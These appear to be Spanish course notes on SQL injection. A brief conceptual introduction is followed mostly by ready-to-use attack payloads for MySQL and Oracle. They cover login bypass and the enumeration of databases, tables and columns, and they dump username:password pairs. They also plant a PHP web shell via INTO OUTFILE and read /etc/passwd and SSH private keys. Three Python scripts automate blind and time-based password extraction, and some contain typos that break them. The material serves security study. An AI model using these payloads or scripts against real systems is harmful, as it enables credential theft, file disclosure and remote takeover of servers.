# SQL Injection

Tags: #SQLI #OWASP #Explotacion 

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

-   **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
-   **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
-   **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
-   **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
-   **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

-   **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
-   **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
-   **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
-   **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)


## Conforma una DB

Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
**Antes de la primer coma debemos de colocar un valor que no exista en la DB. Así lo que inyectemos se podrá visualizar.**

* [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Inyecciones UNION 'mirando el error en el Output de la Web'

Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre el **error**.
* La mayoría de las inyecciones las puedes hacer empezando por  '
* Dependiendo de la web podemos iniciar con camilla y a veces no, cuando es el caso también no es necesario colocar el comentario -- - al final de la query.
* Un indicio de inyección SQL es encontrar en la url **.php?id=** No es necesario que diga **id** también puede tener otro parámetro. 

```bash
# MYSQL

❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
❯ <user>'-- -                                         # Este se usa en un panel de login 
❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
❯ ' and if()-- a        

+ = Espacio en blanco en la URL
```

## Para saber el numero de columnas.
```bash
# MYSQL

❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
❯ ' union select database(),NULL,user() -- -          # Queremos que muestre el nombre de la base de datos actual en uso, tambien podemos ver al usuario quien corre la base de datos

❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
```

```bash 
# ORACLE

❯ ' union select NULL,NULL from dual-- -              # Dual es una tabla existente en Oracle
❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
```

### Para saber las bases de datos (DB) existentes.
```bash 
# MYSQL

❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el '0' a 1,2,3, etc...
❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes en una linea, pero separadas por comas
```

### Para saber las tablas de la base de datos (DB) especifica.
```bash
# MYSQL

❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes
❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes, pero separadas por comas
❯ ' union select table_name from information_schema.tables limit 0,1-- -   # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
```

```bash 
# ORACLE

❯ ' union select table_name from all_tables-- -              # Nos muestra las tablas en Oracle
❯ ' union select owner from all_tables-- -                   # Nos muestra las tablas en Oracle de los propietarios
❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
```

### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
```bash 
# MYSQL 

❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las columnas existentes
❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las columnas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -     # Nos muestra las columnas existentes en una sola linea, pero separadas por comas
```

```bash 
# ORACLE

❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'-- -   # Mostrar las columnas en Oracle 
```

### Para que nos muestre los datos de las columnas.
```bash
# MYSQL 

❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, esto si la DB no es la que esta en uso y solo asi podemos ver los datos que queremos
❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
❯ ' union select group_concat(username,0x3a,password) from ❮Table_Name❯-- -      # Para que nos muestre los datos de los usuarios y su passwd separados por :

	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
	 # : = 0x3a (Hex) 

❯ ' union select NULL,password from ❮Table_Name❯ where username = '0x61646d696e' -- -  # Podemos ofuscar (ocultar) la data, ya que muchas veces existe una sanitizacion que no permite ingresar cadenas de texto
	# 0x61646d696e (Hex) = admin 

❯ ' union select NULL,concat(username,':',password) from ❮Table_Name❯-- -         # Otra forma de agrupar los datos 
```

```bash 
# ORACLE

❯ ' union select username||':'||password from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
```

## Subir un archivo a una ruta especifica en la maquina victima

```bash 
# Subir un achivo que contiene codigo PHP malicioso en una ruta especifica para hacer ejecucion remota de comandos 'RCE' 

❯ ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php" 

# Ahora vamos a la ruta y con el archov que hemos subido, podemos ejecutar comandos de la siguiente manera:
	shell.php?cmd=whoami
# Podemos meter los comandos pra crear la 'Revershell'
```

## Leer (cargar) archivos de la maquina victima 

```bash 
❯ ' union select load_file("/etc/passwd")-- -                  # Leer el '/etc/passwd' de la maquina victima 
❯ ' union select load_file("/home/user/.ssh/id_rsa")-- -       # Leer el 'id_rsa' del usuario de la maquina victima
```

## Inyecciones Blind con respuesta condicional 

-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**

```bash 
# Esto funciona cuando hay un error visual en la pagina web 

❯ ' and substr((Consulta), Inicio, longitud))=''                          # Forma de usar el substr
	# Longitud = Los caracteres que vamos a extraer
	# Inicio = Es la posicion inicial del caracter a comparar 
	# Consulta = Es la peticion que vamos a hacer

❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MYSQL
	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
	# 'A' es la letra a la que queremos igualar la consulta 

Los primero dos numeros son para ir avanzando en el nombre de la base de datos, los otros dos son para ir avanzando entre las diferentes bases de datos que existan... 
```

```bash 
# Encontrar el usuario de la tabla conocida 

#  Confirmar cada caracter del usuario 'administrator' en la tabla 'users'
❯ ' and (select substring(username,1,1) from users where username='administrator')='a' -- -  
❯ ' and (select substring(username,2,1) from users where username='administrator')='d' -- -

# Obtener cada caracter de la password, del usuario 'adminnistrator' en la tabla 'users'
❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- - 

# Conocer la longitud de la passwd 
❯ ' and (select 'a' from users where username='administrator' and length(password)>5)='a'-- -
	# Podemos ir variando el numero hasta dar con la longitid (>,<,<=,=,>=)
```

```python
# Obtener la passwd de un usuario conocido en una DB conocida 

#!/usr/bin/python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.ascii_lowercase + string.digits

def MakeSQLI():

    password = ""
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1, 21):
	    for character in characteres:
		    cookies = {
			    'TrackingID': "shasfdgh' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
			    'session': 'ajeirbji'
		    }
		    p1.status(cookies['TrackingID'])
		    r = request.get(main_url, cookies=cookies)
		    if "Welcome back!" in r.text:         # Texto donde esta el error en la pagina, si sale eso es correcto 
			    password += character
			    p2.status(password)
			    break

if __name__ == '__main__':
    MakeSQLI()
```

## Inyección Blind con error condicional 

```bash 
# Esto es cuando miras un error '500 internal server error' o un '200 ok' cuando esta bien la consulta
```

## Inyecciones sin ver el error en el Output 'Blind'

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 9 es un valor que no existe en la web
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
#           sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
            p1.status(sqli_url)
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()

```


## SQL Time con Python3

```python 
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def MakeSQLI():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extrated_info = ""

    for position in range(1, 150):
        for character in range(33, 126): # El 1 de abajo es un valor que si existe
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)
           #sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
            p1.status(sqli_url)
            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()
            if time_end - time_start > 0.35:
                extrated_info += chr(character)
                p2.status(extrated_info)
                break

if __name__ == '__main__':
    MakeSQLI()
```



